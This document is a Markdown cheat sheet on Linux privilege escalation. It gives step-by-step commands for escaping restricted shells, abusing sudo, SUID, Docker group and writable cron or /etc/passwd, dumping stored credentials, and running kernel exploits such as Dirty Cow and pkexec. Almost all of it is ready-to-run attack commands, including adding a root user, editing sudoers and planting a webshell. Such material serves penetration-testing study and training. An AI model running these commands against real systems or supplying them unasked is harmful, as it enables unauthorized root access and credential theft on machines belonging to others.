# __Elevate privileges on Linux__
>Author: Pieter Miske
---
### __Escape restricted environments:__
The following techniques are examples and can be used to escape a restricted environment like rbash and chroot\. 
>Multiple escape methods can be foound [here](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)
- Check GTFOBins if there is an available binary that can help you to escape \(e\.g\. Less, Vim, Nmap\)
- Use programming language \(if accessible\)
- Break out via SSH before restricted shell is initialized: `ssh <username>@<target ip> –t "/bin/sh"`
- Bypass restricted shell via SSH by loading bash with no profile: `ssh <username>@<target ip> –t "bash --noprofile"`
- Escape restricted shell vulnerability:
	- 1\. `BASH_CMDS[a]=/bin/sh;a`
	- 2\. `export PATH=$PATH:/bin/`
	- 3\. `export PATH=$PATH:/usr/bin`
- Search for sensitive files, custom binaries or services \(e\.g mysql\) that can help you escape
- Escape Lshell: `echo os.system('/bin/bash')`

### __Automated privesc enumeration:__
- [Linux\-smart\-enumeration](https://github.com/diego-treitos/linux-smart-enumeration): for more verbose output use \-l2\): `./lse.sh -l1`
- [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): `./linpeas.sh -a | tee output.txt`

### __Abuse users & groups:__
#### _Identify interesting users:_
- 1\. Check what other interesting users are on the system:
	- Current logged in users: `who`
	- Previous logins: `last`
	- Users with sudo rights: `grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'`
- 2\. If user is part of a exploitable group or can run/access a service as root, try to compromise that user account\. 

#### _Login as another user account:_
- Login with creds:
	- Escalate to another user: `su <username>`
	- If "su" is unavailable: `doas -u <username> /bin/sh`
- Bruteforce passwords: Sucrack is a multithreaded Linux/UNIX tool for brute-force cracking local user accounts via su. 
	- 1\. Upload the compiled version of [sucrack](https://github.com/hemp3l/sucrack) and a passwordlist to the target system\. 
	- 2\. Start bruteforce authentication attempts via su \(default is root user\): `./sucrack -w <threads (e.g. 5)> (-u <username>) passwordfile.txt`

#### _Identify exploitable group memberships:_
- 1\. Identify the groups the current user is part of: `id`
- 2\. Check if the group may allow for privesc\. 

#### _Docker Group:_
If the current user is in the docker group or docker\.socks is writeable it is possible to mount a host partition inside the container to get root privileges\.
- 1\. Enumerate the docker instance for vulnerbailities: 
	- Automated enumeation: upload deepce\.sh to target host and run \([deepce](https://github.com/stealthcopter/deepce.git)\): `./deelce.sh `
	- Manual enumeation:
		- List available images \(docker images are read\-only templates used to build containers\): `docker images`
		- List containers \(containers are deployed instances created from image templates\): `docker container ls`
		- List running and stopped containers: `docker ps -a`
		- Get info of the container: `docker inspect <containerid>`
		- Get shell inside image \(this will start a container\): `docker run -i -t <image name (e.g. ubuntu)>:<tag name (e.g. latest)> /bin/bash`
		- Get shell inside a container: `docker exec -it <containerid> /bin/sh`
- 2\. Exploit vulnerable docker configuration:
	- Docker group: 
		- 1\. List images: `docker images`
		- 2\. Mount host partition to image: `docker run -v /:/mnt --rm -it <image name>:<tag name> chroot /mnt sh`
	- Writeable socks: 
		- 1\. Search for the socket \(usual location "/run/docker.sock"): `find / -name docker.sock 2>/dev/null`
		- 2\. List images: `docker images`
		- 3\. Mount host partition to image \(if docker socket is in an unusual place use "\-H unix:///path/to/docker\.sock"\): `docker run -it -v /:/mnt/ <image name>:<tag name> chroot /mnt/ bash`

### __Abuse execution permissions:__ 
#### _Sudoers privilege abuse:_
In the /etc/sudoers file, extra permissions can be assigned to a specific user that may run specific or all commands with root privileges\. 
- 1\. List services that current user can run with sudo privileges:
	- `sudo -l`
	- `cat /etc/sudoers`
- 2\. Exploit privileges:
	- NOPASSWD: If “\(ALL:ALL\) ALL” and “\(ALL\) NOPASSWD: ALL”  privileges are set, game on\! Current user has sudo rights and no password is needed: `sudo su`
	- \!root: If result looks like “\(ALL, \!root\) /bin/bash” use the following command to get root shell: `sudo \u#-1 /bin/bash`
	- Specific service: If sudo privilege is set for a specific service: 
		- 1\. Determine if it is a known service or custom program/script:
			- If it is a known service,  check [GTFObin](https://gtfobins.github.io/) if the service can be used for privesc \(e\.g\. nmap, vi, less, find\)
			- If it a custom program/script, enumerate what it does and find a possible way to get command execution \(e\.g\. dangerous programming functionalities, etc\.\)
		- 2\. Run vulnerable service/program with sudo rights:
			- As current user: `sudo <path/to/service> `
			- As other user:` sudo -u <username> <path/to/service>`
	- Service is an editor: 
		- If user is only allowed to use the editor against a specific file but the path contains \* \(e\.g\. “\(root\) NOPASSWD: sudoedit /home/\*/\*/file\.txt”\), make sure that the \* are all filled in with an existing directory\. Try to modify \(via symlink attack\) and/or read sensitive files \(e\.g\. /etc/shadow\)\.
		- If user is only allowed to use the editor within a specific directory \(e\.g\. \(root\) NOPASSWD: /bin/nano /var/opt/\*\)? 
			- 1\. Try path traversal technique to modify sudoeurs and add root privileges to current user account: `sudo </path/to/editor>/../../etc/sudoers`
			- 2\. In the sudoers file modify privileges for the current user: `<username> ALL=(ALL) NOPASSWD:ALL`
			- 3\. Save changes and privesc to root: `sudo su`

#### _SUID permission abuse:_
SUID/Setuid stands for "set user ID upon execution" and it is enabled by default in every Linux distributions\. If the file owner is root, the uid will be changed to root even if it was executed from a low privileged user\. SUID bit is represented by an ‘s’\.
>SUID binary must be run without sudo\. It is recommended to use the "chmod u\+s /bin/bash" technique instead if spanning a new shell\. 
- 1\. Check if the SUID bit is set on a binary \(looks like: \-rw\[s\]r\-xr\-x\): `find / -perm -4000 2>/dev/null | xargs ls -la`
- 2\. If yes, analyse the binary:
	- GTFOBins: search [GTFObin](https://gtfobins.github.io/) if the binary is known and can be used for privesc and follow instructions as described for this specific exploitation.
	- Custom binary: 
		- 1\. Analyse what the binary does \(recommended to use [pspy64](https://github.com/DominicBreuker/pspy) and strings\) 
		- 2\. \(optional\) if the binary uses another binary without specifing its full path, privesc is most likely possible:
			- 1\. Create new binary in the home directy of the current user \(don't forget to chmod \+x\): `echo 'chmod u+s /bin/bash' > <name binary that is called by the setuid binary>`
			- 2\. Add the home directy as the first entry to the environment path: `export PATH="$HOME:$PATH"`
			- 3\. Run the setuid binary\.
	- CVE\-2021\-4034\: this local privilege escalation vulnerability exists in polkit's pkexec, a SUID\-root program that is installed by default on every major Linux distribution\.
        - 1\. Downlaod and compile exploit \([CVE\-2021\-4034](https://github.com/ryaagard/CVE-2021-4034)\): `make`
        - 2\. Upload both the 'exploit' and 'evil\.so' files to the target system and give 'exploit' execution permissions: `chmod +x exploit`
        - 3\. Elevate to root: `./exploit`

#### _Linux Capability abuse:_
Capabilities in Linux are special attributes that can be allocated to processes, binaries, services and users and they can allow them specific privileges that are normally reserved for root\-level actions, such as being able to intercept network traffic or mount/unmount file systems\. If misconfigured, these could allow an attacker to elevate their privileges to root\.
- 1\. List Linux Capabilities \(also lse\.sh will list them\): `getcap -r / 2>/dev/null`
- 2\. Search if one of the binaries can be used for privilege escalation (e.g. python)`

#### _Identify vulnerable local service:_
- 1\. Search for interesting services:
	- Check for local running services: `netstat -tulpn`
	- Check if the service is running in privileged context: `ps -aux | grep <PID>`
	- Check what new processes are started on the system \(use \-f for verbose output\) \([pspy64](https://github.com/DominicBreuker/pspy)\): `./pspy64 (-f)`
- 2\. Check if the service can be exploited:
	- Check if you can access the service \(e\.g\. mysql or nfs\) with root privileges either anonymously or with obtained creds 
	- Analyse the inner workings of the service binary: `strace <binary name>`
	- List service version and check if it is vulnerable: `<service name> (-v | --version)`
- 3\. Exploit service \(few examples\):
	- MySQL/MariaDB: 
		- Search database and dump interresting content
		- Modify database content to gain access to an interesting application with high privileges
		- UDF Exploitation\. 
	- Web service like Apache: drop a webshell in the root web folder and activate it via the browser\. 

### __Abuse write permissions:__
#### _Cronjob exploitation:_
- 1\. Search for vulnerable cronjob files: 
	- 1\. Search for files that are writeable by all users and run as root \(check if rwx permissions are set\): `find /etc/cron* -type f -perm -o+w -exec ls -l {} \;`
	- 2\. pspy tool can give information about running jobs \(if the job is frequently executed\) \(tool must be uploaded first\) \([pspy64](https://github.com/DominicBreuker/pspy)\): `./pspy64`
- 2\. Modify the found cronjob to execute an arbitrary command \(example set SUID bit for bash\): `echo \e ‘#!/bin/bash\n/bin/chmod u+s /bin/bash’> </path/to/cronjob (e.g. /etc/cron.hourly/oddjob)>`

#### _Identify folder & file write permissions:_
- Find writeable folders: `find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null`
- Find writeable files \(use 1 dir \(e\.g\. etc\) to search in each time for less verbose output\): `find /etc -type f \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null`

#### _Insecure file & folder permission abuse:_
- /etc/passwd: for backwards compatibility, if a password hash is present in the second column of a /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow if available\.
	- 1\. Check if you have write permissions for the "/etc/passwd" file 
	- 2\. If yes, add new root user \(root2\) to the file: 
		- 1\. First create hashed password: `openssl passwd <password>`
		- 2\. Write new user to /etc/passwd:  `echo "root2:<generated hash>:0:0:root:/root:/bin/bash" >> /etc/passwd`
	- 3\. Elevate to your added root user: `su root2`
- /etc/sudoers: set sudo rights to ALL for controlled user: `echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers`
- User SSH folder: Create an ssh key and copy it to the ‘/home/user/\.ssh/authorized\_keys’ folder of the user you have write permissions for\. 
- Ansible: If you have write access to a playbook, modify it to add own command to the playbook that will run as root:
	- 1\. Modify the playbook so its runs your command and add "become: yes" to the file to run it as root \(example\):
        ```
        ---
        - name: Example original code
          hosts: all
          gather_facts: true
          become: yes
          tasks:
            - name: Example code
            debug:
              msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
            - name: new malicious command
              shell: <command to run>
              async: 10
              poll: 0
        ```
	- 2\. Run playbook or wait until its run by a privileged user: `ansible-playbook <playbook.yaml>`

### __Search for secrets on the local system:__
#### _General file search queries:_
- Search for files that are recently modified: `find /<dir (e.g. home) -type f -mmin -<minutes (e.g. 60)>`
- Search for specific file type/name: `find /* -name "*.php" -print 2>/dev/null`
- Search for a specific word in files \(example: db\_passwd, password\): `find . -type f -maxdepth 4 | xargs grep -i "<search term>"`
- Check binary files for readable strings: `strings <file>` 

#### _Interesting files to search for:_
- Check user command history \(search for mistakenly entered clear text passwords\): `history`
- Check if you can access on of the following files that store hashed or encoded passwords:
    ```
    .htpasswd
    .htaccess
    /etc/shadow
    .config
    ```
- Check for SSH keys
- Search in log files for interesting information:
    ```
    /var/log/auth.log
    /var/log/apache2/access_log
    ```
- Dump cleartext Pre\-Shared Wireless Keys from Network Manager: `cat /etc/NetworkManager/system-connections/* |grep -E "^id|^psk"`
- Ansible: check for hardcoded creds or other secrets in any stored playbooks \(playbooks have the \.yaml/\.yml extention\), backups and "/var/log/syslog" file\.

#### _Dump stored web credentials/cookies:_
This tool supports the most popular browsers on the market and runs on Windows, macOS and Linux\.
- 1\. Run tool which stores all results in a new folder called "results" \([HackBrowserData](https://github.com/moonD4rk/HackBrowserData)\): `hack-browser-data -dir <path to store folder with results>`
- 2\. Extract the interesting files back to your system and start analysing\. 

### __System exploitation:__
#### _Exploit vulnerable kernel:_
- 1\. List kernel version: `uname -a`
- 2\. Search if the kernel is vulnerable and download the PoC or choose one of the below reliable exploits:
    - Ubuntu 12\.04\.2: [perf\_swevent\_init \- Linux Kernel <  3\.8\.9 \(x86\-64\)](https://www.exploit-db.com/exploits/26131)
    - Ubuntu 11\.10 | Ubuntu 10\.04  | Redhat 6: [mempodipper \- Linux Kernel 2\.6\.39 < 3\.2\.2 \(x86\-64\)](https://www.exploit-db.com/exploits/35161)
    - Ubuntu 12\.04 | Ubuntu 14\.04 | Ubuntu 16\.04:
	    - Dirty Cow write to file:
			- 1\. Compile exploit on target system or simular own system \([DirtyCow](https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c)\): `gcc -pthread pokemon.c -o exploit`
			- 2\. Generate new hashes password: `openssl passwd <password>`
			- 3\. On the target system run the exploit which will add a new root user to the /etc/passwd file: `./exploit /etc/passwd 'root2:<generate hash>:0:0:root:/root:/bin/bash'`
			- 4\. Escalate to root: `su root2`
		- Dirty Cow firefart /etc/passwd:
			- 1\. Compile the PoC \([DirtyCow](•%09https:/github.com/FireFart/dirtycow/blob/master/dirty.c)\): `gcc -pthread dirty.c -o dirty -lcrypt`
			- 2\. Run the exploit and submit a password for the new user “firefart”
			- 3\. Escalate to root via “firefart”: `su firefart`
    - Ubuntu 14\.04 | Ubuntu 16\.04:[ KASLR / SMEP \- Linux Kernel < 4\.4\.0\-83 / < 4\.8\.0\-58](https://www.exploit-db.com/exploits/43418)
- 3\. If not already, compile PoC and run on target system:
	- C code for UNIX based systems: It is important that the environment where the C code is compiled matches that of the target environment\. Compile C code: `gcc script.c -o exploit`
	- Compile 32bit binary on x64 bit system:
		- 1\. Install libraries: 
			- `sudo apt-get install gcc-9-base`
			- `sudo apt-get install gcc-multilib`
		- 2\. Compile c code \(both \-Wall and \-Wl are optional\): `gcc -m32 (-Wall) -o <output file> <script>.c (-Wl,--hash-style=both)`
